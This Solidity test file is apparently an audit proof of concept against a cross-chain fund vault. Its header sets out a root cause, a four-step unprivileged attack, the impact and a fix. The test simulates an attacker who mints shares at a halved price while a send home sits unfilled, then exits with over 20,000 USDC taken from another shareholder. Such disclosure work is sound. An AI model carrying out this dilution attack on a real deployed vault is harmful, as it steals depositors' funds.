// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {Transit, TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {AccountingPocFixture} from "./AccountingPocFixture.sol";

/// @title PoC: an unfilled transfer home leaves every value base before its refund exists, and mints are priced
///        without it
/// @notice Severity: HIGH (dilution theft from the Shareholders by any depositor, under realistic conditions).
///
/// Root cause: `SpokeCrossChainLib._stillInFlight` stops listing a hub-bound transit at `fillDeadline + maxReportAge`
/// and "presumes it filled" (OQ-09 stance). When the deposit was in fact NOT filled, the value is nowhere:
///  - the spoke debited its Unallocated Balance when it sent;
///  - the hub never received a fill, so nothing reached Idle;
///  - the report no longer lists the transit, so `CoreVaultLogic._returnLeg` counts nothing;
///  - the Across refund only reaches the transit's escrow 55 to 90 minutes after the fill deadline (DEC-063 measured
///    fact), and only `recognizeRefund` plus one more accepted report (another 15 to 20 minutes) brings it back.
/// `maxReportAge` is about 26 minutes, so for at least half an hour, and until somebody recognizes the refund, a
/// FRESH accepted report prices the fund without the transfer (DEC-104 violated). Mints are open on a fresh report.
///
/// Attack sequence (unprivileged; the attacker only watches for an unfilled `SentToHub`):
///  1. A send home stays unfilled (relayers skip it: amount above the route's relayer liquidity, a fee quoted too low,
///     an exclusive relayer that does not fill, a relayer outage; docs/INTEGRATIONS.md records that route liveness is
///     an off-chain property).
///  2. At `fillDeadline + maxReportAge + 1` the attacker calls the permissionless `SpokeVault.report()` and delivers
///     the VAA: Share Assets drop by the transfer.
///  3. The attacker deposits at the depressed Share Price.
///  4. Anyone recognizes the Across refund on the spoke and the next report restores Share Assets: the attacker's
///     shares are repriced upward and they exit.
///
/// Impact: here half of the fund is in the unfilled transfer, the Share Price halves, and an attacker who deposits
/// 50,000 USDC walks away with about 23,000 USDC of Alice's money after paying every fee of an Instant Payout. The
/// closer the transfer is to the whole fund, the closer the attacker gets to owning all of it for cents. Payouts
/// claimed in the window are symmetric: the leaver is underpaid.
///
/// Fix: keep a hub-bound transit in `inFlightToHub` until its outcome is known (the hub credited it, or the refund
/// was recognized). The hub already ignores a listed amount it has credited (`amount - credited`), so listing a
/// filled transit longer is harmless, while dropping an unfilled one is not. If a timer must exist, it must be longer
/// than the worst-case Across refund latency and the hub must refuse mints while an unresolved hub-bound transit is
/// past its deadline.
contract ExpiredSendHomeBaseGapPoC is AccountingPocFixture {
    uint256 internal constant DEPOSIT = 100_000e6;
    uint256 internal constant SENT_TO_SPOKE = 50_000e6;
    uint256 internal constant ARRIVES_ON_SPOKE = 49_975e6;
    uint256 internal constant QUOTED_HOME = 49_950e6;
    uint256 internal constant ATTACK_DEPOSIT = 50_000e6;

    address internal mallory = makeAddr("mallory");

    function setUp() public {
        _deployFund(2000, 25);
    }

    function test_POC_expiredSendHomeLeavesEveryBaseAndMintsAtHalfPrice() public {
        _deposit(alice, DEPOSIT);
        bytes32 outbound = _sendToSpoke(SENT_TO_SPOKE, ARRIVES_ON_SPOKE);
        _fillOnSpoke(outbound, ARRIVES_ON_SPOKE);
        _reportAndDeliver();
        uint256 idle = core.idle();
        assertEq(core.shareAssets(), idle + ARRIVES_ON_SPOKE, "Share Assets before the send home");

        // 1. The Manager sends the spoke balance home. No relayer fills it.
        bytes32 home = _sendHome(ARRIVES_ON_SPOKE, QUOTED_HOME, TransferKind.Principal);
        Transit memory t = spokeVault.hubBoundTransit(home);
        _reportAndDeliver();
        uint256 fairAssets = core.shareAssets();
        uint256 fairPrice = core.sharePrice();
        assertEq(fairAssets, idle + QUOTED_HOME, "DEC-085: the return leg counts while the report lists it");
        uint256 aliceFair = _valueOf(alice);

        // 2. One second after fillDeadline + maxReportAge the report stops listing the transit. Across has not
        //    refunded yet (55 to 90 minutes after the deadline), so the value is in no base.
        vm.warp(uint256(t.fillDeadline) + MAX_REPORT_AGE + 1);
        _reportAndDeliver();
        assertEq(usdg.balanceOf(t.escrow), 0, "no refund exists yet");
        assertEq(core.shareAssets(), idle, "DEC-104: the unfilled transfer left every base");
        uint256 gapPrice = core.sharePrice();
        assertLt(gapPrice * 2, fairPrice + fairPrice / 100, "the Share Price about halved");

        // 3. Mallory mints on that fresh report, at half price.
        (uint256 minted, uint256 charged) = _deposit(mallory, ATTACK_DEPOSIT);
        assertGt(minted, shares.balanceOf(alice), "Mallory holds more shares than Alice for half of Alice's money");

        // 4. The Across refund lands 60 minutes after the deadline; anyone recognizes it; the next report counts it.
        vm.warp(uint256(t.fillDeadline) + 60 minutes);
        spokeAcross.refund(t.escrow, address(usdg), ARRIVES_ON_SPOKE);
        spokeVault.recognizeRefund(home);
        _reportAndDeliver();
        assertEq(core.shareAssets(), core.idle() + ARRIVES_ON_SPOKE, "the transfer is back in Share Assets");

        // Mallory exits with an Instant Payout and pays every fee (Payout Fee 2 %, flow fee 0.25 %).
        vm.startPrank(mallory);
        core.requestPayout(1_000_000e6, ICoreVault.PayoutMode.Instant);
        ICoreVault.PayoutReceipt memory r = core.claimPayout("");
        vm.stopPrank();
        assertEq(shares.balanceOf(mallory), 0, "full exit");

        uint256 profit = r.usdcPaid - charged;
        assertGt(profit, 20_000e6, "Mallory nets more than 20,000 USDC after all fees");

        // Alice, the only other Shareholder, paid for it: no position lost a cent.
        uint256 aliceAfter = _valueOf(alice);
        assertGt(aliceFair - aliceAfter, 20_000e6, "Alice lost more than 20,000 USDC to dilution");
        emit log_named_decimal_uint("Mallory profit (USDC)", profit, 6);
        emit log_named_decimal_uint("Alice loss (USDC)", aliceFair - aliceAfter, 6);
    }
}
